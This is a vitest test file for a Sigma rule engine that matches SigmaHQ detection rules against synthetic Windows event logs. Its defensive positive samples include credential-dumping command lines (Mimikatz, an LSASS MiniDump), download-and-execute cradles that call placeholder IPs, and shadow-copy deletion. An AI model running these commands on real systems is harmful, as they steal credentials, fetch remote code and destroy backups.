import { describe, expect, it } from "vitest";

import bundleJson from "@/lib/sigma/sigmahq-rules.json";
import { runSigma, type SigmaRow, type SigmaSource } from "@/lib/sigma/runner";
import type { SigmaBundle } from "@/lib/sigma/types";

import { FIXTURE_FILES, HAS_FIXTURES, loadFixtures } from "./helpers";

const bundle = bundleJson as unknown as SigmaBundle;

type Synth = SigmaRow & { pairs: [string, string][] };

const SYSMON = { provider: "Microsoft-Windows-Sysmon", channel: "Microsoft-Windows-Sysmon/Operational" };
const SECURITY = { provider: "Microsoft-Windows-Security-Auditing", channel: "Security" };
const PS = { provider: "Microsoft-Windows-PowerShell", channel: "Microsoft-Windows-PowerShell/Operational" };
const SYSTEM = { provider: "Service Control Manager", channel: "System" };

let rid = 1;
function row(src: { provider: string; channel: string }, eventId: number, data: Record<string, string>): Synth {
  return { record_id: rid++, level: 4, event_id: eventId, computer: "WS01.corp.local", ...src, pairs: Object.entries(data) };
}

function source(rows: Synth[], offset = 0): SigmaSource {
  return {
    offset,
    count: rows.length,
    rows: (s, n) => rows.slice(s, s + n),
    pairs: (s, n) => rows.slice(s, s + n).map((r) => r.pairs),
  };
}

async function matchedIds(rows: Synth[], customTexts: string[] = []): Promise<Map<string, number[]>> {
  const res = await runSigma({ bundle, customTexts, sources: [source(rows)] });
  return new Map(res.matches.map((m) => [m.rule.id, m.gids]));
}

const ID = {
  auditLogCleared: "d99b79d2-0a6f-4f46-ad8b-260b6e17f982",
  mimikatzCli: "a642964e-bead-4bed-8910-1bb4d63e3b4d",
  certutilDownload: "19b08b1c-861d-4e75-a1ef-ea0c1baf202b",
  maliciousCmdlets: "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
  failedLogonReasons: "9eb99343-d336-4020-a3cd-67f3819e68ee",
  rdpReverseTunnel: "5f699bc5-5446-4a4a-a0b7-5ef2885a3eb4",
  defenderFirewallOff: "974515da-6cc5-4c95-ae65-f97f9150ec7f",
};

describe("bundled SigmaHQ rule set", () => {
  it("is pinned, attributed and runnable", () => {
    expect(bundle.release).toMatch(/^r\d{4}-\d{2}-\d{2}$/);
    expect(bundle.license).toMatch(/DRL\) 1\.1/);
    expect(bundle.rules.length).toBe(bundle.counts.bundled);
    expect(bundle.rules.length).toBeGreaterThan(2000);
    for (const r of bundle.rules) {
      expect(r.id).toBeTruthy();
      expect(r.title).toBeTruthy();
      expect(r.path).toMatch(/^rules\/windows\//);
      expect(r.status).not.toMatch(/deprecated|unsupported/);
    }
    for (const id of Object.values(ID)) expect(bundle.rules.some((r) => r.id === id)).toBe(true);
  });
});

describe("real SigmaHQ rules on synthetic events", () => {
  it("Security audit log cleared (1102 from Microsoft-Windows-Eventlog)", async () => {
    const hits = await matchedIds([
      row({ provider: "Microsoft-Windows-Eventlog", channel: "Security" }, 1102, { SubjectUserName: "admin" }),
      row({ provider: "Microsoft-Windows-Eventlog", channel: "System" }, 1102, {}),
      row(SECURITY, 1102, {}),
    ]);
    expect(hits.get(ID.auditLogCleared)).toEqual([0]);
  });

  it("Mimikatz command line — Sysmon 1 and Security 4688, not benign commands", async () => {
    const hits = await matchedIds([
      row(SYSMON, 1, { Image: "C:\\Temp\\m.exe", CommandLine: 'm.exe "privilege::debug" "sekurlsa::logonpasswords" exit', ParentImage: "C:\\Windows\\explorer.exe" }),
      row(SECURITY, 4688, { NewProcessName: "C:\\Temp\\m.exe", CommandLine: "m.exe lsadump::sam", ParentProcessName: "C:\\Windows\\System32\\cmd.exe", SubjectUserName: "bob", SubjectDomainName: "CORP", MandatoryLabel: "S-1-16-12288" }),
      row(SYSMON, 1, { Image: "C:\\Windows\\System32\\notepad.exe", CommandLine: "notepad.exe report.txt" }),
      // Right command line, wrong source (Sysmon 3 is network, not process creation).
      row(SYSMON, 3, { Image: "C:\\Temp\\m.exe", CommandLine: "sekurlsa::logonpasswords" }),
    ]);
    expect(hits.get(ID.mimikatzCli)).toEqual([0, 1]);
  });

  it("certutil download: all of selection_* (image OR OriginalFileName)", async () => {
    const hits = await matchedIds([
      row(SYSMON, 1, { Image: "C:\\Windows\\System32\\certutil.exe", CommandLine: "certutil -urlcache -split -f http://10.0.0.5/a.exe a.exe" }),
      row(SYSMON, 1, { Image: "C:\\Users\\x\\renamed.exe", OriginalFileName: "CertUtil.exe", CommandLine: "renamed -urlcache -f https://x.example/p" }),
      row(SYSMON, 1, { Image: "C:\\Windows\\System32\\certutil.exe", CommandLine: "certutil -hashfile a.exe SHA256" }),
    ]);
    expect(hits.get(ID.certutilDownload)).toEqual([0, 1]);
  });

  it("malicious PowerShell cmdlets in 4104 script blocks", async () => {
    const hits = await matchedIds([
      row(PS, 4104, { ScriptBlockText: "Import-Module .\\PowerView.ps1; Find-GPOLocation -UserName bob" }),
      row(PS, 4104, { ScriptBlockText: "Get-ChildItem C:\\ | Sort-Object Length" }),
      row(PS, 4103, { Payload: "Find-GPOLocation" }),
    ]);
    expect(hits.get(ID.maliciousCmdlets)).toEqual([0]);
  });

  it("failed logon reasons: all of selection_* and not filter", async () => {
    const hits = await matchedIds([
      row(SECURITY, 4625, { TargetUserName: "bob", Status: "0xC000006E", SubStatus: "0xC0000072", SubjectUserSid: "S-1-5-18" }),
      row(SECURITY, 4625, { TargetUserName: "bob", Status: "0xC000006D", SubStatus: "0xC000006A", SubjectUserSid: "S-1-5-18" }),
      row(SECURITY, 4625, { TargetUserName: "bob", Status: "0xC0000072", SubStatus: "0x0", SubjectUserSid: "S-1-0-0" }),
    ]);
    expect(hits.get(ID.failedLogonReasons)).toEqual([0]);
  });

  it("RDP reverse tunnel: cidr on loopback, IPv4 and IPv6", async () => {
    const hits = await matchedIds([
      row(SYSMON, 3, { Image: "C:\\Windows\\System32\\svchost.exe", Initiated: "true", SourcePort: "3389", DestinationIp: "127.0.0.1" }),
      row(SYSMON, 3, { Image: "C:\\Windows\\System32\\svchost.exe", Initiated: "true", SourcePort: "3389", DestinationIp: "::1" }),
      row(SYSMON, 3, { Image: "C:\\Windows\\System32\\svchost.exe", Initiated: "true", SourcePort: "3389", DestinationIp: "10.1.1.1" }),
    ]);
    expect(hits.get(ID.rdpReverseTunnel)).toEqual([0, 1]);
  });

  it("registry_set (Sysmon 13): firewall disabled", async () => {
    const key = "HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\EnableFirewall";
    const hits = await matchedIds([
      row(SYSMON, 13, { EventType: "SetValue", TargetObject: key, Details: "DWORD (0x00000000)" }),
      row(SYSMON, 13, { EventType: "SetValue", TargetObject: key, Details: "DWORD (0x00000001)" }),
      row(SYSMON, 12, { EventType: "SetValue", TargetObject: key, Details: "DWORD (0x00000000)" }),
    ]);
    expect(hits.get(ID.defenderFirewallOff)).toEqual([0]);
  });

  it("custom rules run next to the bundled set; invalid ones are reported", async () => {
    const res = await runSigma({
      bundle,
      customTexts: [
        `title: Service named evil
id: 0b7c1b86-0000-4000-8000-000000000001
author: Local analyst
level: critical
logsource: { product: windows, service: system }
detection:
  selection: { EventID: 7045, ServiceName|contains: evil }
  condition: selection`,
        "title: nope\nlogsource: {product: windows}\ndetection: {condition: missing}",
      ],
      sources: [source([row(SYSTEM, 7045, { ServiceName: "EvilSvc", ImagePath: "C:\\x.exe" }), row(SYSTEM, 7045, { ServiceName: "Spooler" })])],
    });
    const custom = res.matches.find((m) => m.rule.source === "custom");
    expect(custom?.rule.title).toBe("Service named evil");
    expect(custom?.gids).toEqual([0]);
    expect(res.matches[0].rule.level).toBe("critical");
    expect(res.customErrors).toHaveLength(1);
    expect(res.stats.custom).toBe(1);
  });
});

// Synthetic mixed workload: Security, Sysmon, PowerShell and System records.
function synthetic(n: number): Synth[] {
  const users = ["alice", "bob", "carol", "svc_backup", "admin"];
  const images = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\rundll32.exe",
  ];
  const out: Synth[] = [];
  for (let i = 0; i < n; i++) {
    const u = users[i % users.length];
    const img = images[i % images.length];
    switch (i % 10) {
      case 0:
      case 1:
        out.push(row(SECURITY, 4624, { SubjectUserSid: "S-1-5-18", TargetUserName: u, TargetDomainName: "CORP", LogonType: String((i % 3) + 2), IpAddress: `10.0.${i % 255}.${(i >> 8) % 255}`, WorkstationName: "WS02", LogonProcessName: "NtLmSsp", AuthenticationPackageName: "NTLM" }));
        break;
      case 2:
        out.push(row(SECURITY, 4625, { TargetUserName: u, Status: "0xC000006D", SubStatus: "0xC000006A", IpAddress: "192.168.1.50", LogonType: "3" }));
        break;
      case 3:
        out.push(row(SECURITY, 4688, { NewProcessName: img, CommandLine: `${img} --type=renderer --id ${i}`, ParentProcessName: images[(i + 1) % images.length], SubjectUserName: u, SubjectDomainName: "CORP", MandatoryLabel: "S-1-16-8192" }));
        break;
      case 4:
      case 5:
        out.push(row(SYSMON, 1, { UtcTime: "2026-09-01 10:00:00.000", ProcessGuid: `{${i}}`, Image: img, CommandLine: `"${img}" /c echo ${i} && dir C:\\Users\\${u}`, CurrentDirectory: "C:\\Windows\\system32\\", User: `CORP\\${u}`, IntegrityLevel: "Medium", Hashes: "SHA1=0,MD5=0,SHA256=0,IMPHASH=0", ParentImage: images[(i + 2) % images.length], ParentCommandLine: "explorer.exe", OriginalFileName: "cmd.exe", Company: "Microsoft", Product: "Windows", Description: "Windows Command Processor" }));
        break;
      case 6:
        out.push(row(SYSMON, 3, { Image: img, User: `CORP\\${u}`, Protocol: "tcp", Initiated: "true", SourceIp: "10.0.0.5", SourcePort: String(40000 + (i % 20000)), DestinationIp: `142.250.${i % 255}.1`, DestinationHostname: "example.com", DestinationPort: "443" }));
        break;
      case 7:
        out.push(row(SYSMON, 11, { Image: img, TargetFilename: `C:\\Users\\${u}\\AppData\\Local\\Temp\\file${i}.tmp`, User: `CORP\\${u}` }));
        break;
      case 8:
        out.push(row(SYSMON, 13, { EventType: "SetValue", Image: img, TargetObject: `HKU\\S-1-5-21\\Software\\Vendor\\App\\Setting${i % 50}`, Details: `DWORD (0x0000000${i % 9})` }));
        break;
      default:
        out.push(i % 20 === 9
          ? row(PS, 4104, { MessageNumber: "1", MessageTotal: "1", ScriptBlockText: `Get-ChildItem -Path C:\\Users\\${u} | Where-Object { $_.Length -gt ${i} }`, ScriptBlockId: `{${i}}` })
          : row(SYSTEM, 7036, { param1: "Windows Update", param2: "running" }));
    }
  }
  return out;
}

describe.skipIf(!HAS_FIXTURES)("SigmaHQ on the real-log fixtures", () => {
  it("fires the expected rules on the fixture set", async () => {
    const ds = loadFixtures(...FIXTURE_FILES);
    const res = await runSigma({
      bundle,
      customTexts: [],
      sources: [{ offset: 0, count: ds.rows.length, rows: (s, n) => ds.rows.slice(s, s + n), pairs: (s, n) => ds.pairs.slice(s, s + n) }],
    });
    expect(Object.fromEntries(res.matches.map((m) => [m.rule.title, m.gids.length]))).toEqual({
      "A Member Was Added to a Security-Enabled Global Group": 8,
      "Local User Creation": 8,
      "Windows Service Terminated With Error": 3,
      "A Member Was Removed From a Security-Enabled Global Group": 1,
      "User Logoff Event": 64,
    });
    const created = res.matches.find((m) => m.rule.title === "Local User Creation")!;
    for (const g of created.gids) expect(ds.rows[g].event_id).toBe(4720);
  });
});

describe("literal pre-filter", () => {
  it("gives exactly the same matches as evaluating every candidate rule", async () => {
    // Synthetic workload plus the crafted positives above, so many rules fire.
    rid = 1;
    const events = synthetic(6_000);
    const extra = [
      row(SYSMON, 1, { Image: "C:\\Temp\\m.exe", CommandLine: 'm.exe "privilege::debug" "sekurlsa::logonpasswords" exit' }),
      row(SYSMON, 1, { Image: "C:\\Windows\\System32\\certutil.exe", CommandLine: "certutil -urlcache -split -f http://10.0.0.5/a.exe a.exe" }),
      row(SYSMON, 1, { Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" }),
      row(SYSMON, 1, { Image: "C:\\Windows\\System32\\rundll32.exe", CommandLine: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full" }),
      row(SYSMON, 10, { SourceImage: "C:\\Temp\\x.exe", TargetImage: "C:\\Windows\\system32\\lsass.exe", GrantedAccess: "0x1010", CallTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|UNKNOWN(000001)" }),
      row(PS, 4104, { ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a'); Invoke-Mimikatz -DumpCreds" }),
      row(SECURITY, 4688, { NewProcessName: "C:\\Windows\\System32\\vssadmin.exe", CommandLine: "vssadmin delete shadows /all /quiet", SubjectUserName: "bob", SubjectDomainName: "CORP" }),
      row(SYSTEM, 7045, { ServiceName: "PSEXESVC", ImagePath: "%SystemRoot%\\PSEXESVC.exe", ServiceType: "user mode service", StartType: "demand start", AccountName: "LocalSystem" }),
      row({ provider: "Microsoft-Windows-Eventlog", channel: "Security" }, 1102, { SubjectUserName: "admin" }),
    ];
    const all = [...events, ...extra];
    const on = await runSigma({ bundle, customTexts: [], sources: [source(all)] });
    const off = await runSigma({ bundle, customTexts: [], sources: [source(all)], gates: false });
    const flat = (r: typeof on) => r.matches.map((m) => `${m.rule.id}:${m.gids.join(",")}`).sort();
    expect(on.matches.length).toBeGreaterThan(8);
    expect(flat(on)).toEqual(flat(off));
  }, 120_000);
});

describe("performance", () => {
  it("200k synthetic events × full rule set", async () => {
    const events = synthetic(200_000);
    let progressCalls = 0;
    const t0 = performance.now();
    const res = await runSigma({
      bundle,
      customTexts: [],
      // Two "files" so offsets are exercised too.
      sources: [source(events.slice(0, 120_000)), source(events.slice(120_000), 120_000)],
      onProgress: () => progressCalls++,
    });
    const ms = performance.now() - t0;
    console.log(
      `[sigma perf] ${res.stats.events} events × ${res.stats.evaluated} rules → ${res.matches.length} rules matched in ${ms.toFixed(0)} ms (${Math.round(res.stats.events / (ms / 1000)).toLocaleString("en")} events/s)`,
    );
    expect(res.stats.events).toBe(200_000);
    expect(progressCalls).toBeGreaterThan(10);
    for (const m of res.matches) for (const g of m.gids) expect(g).toBeLessThan(200_000);
    // Budget: generous for CI machines; typically a few seconds locally.
    expect(ms).toBeLessThan(30_000);
  }, 120_000);
});
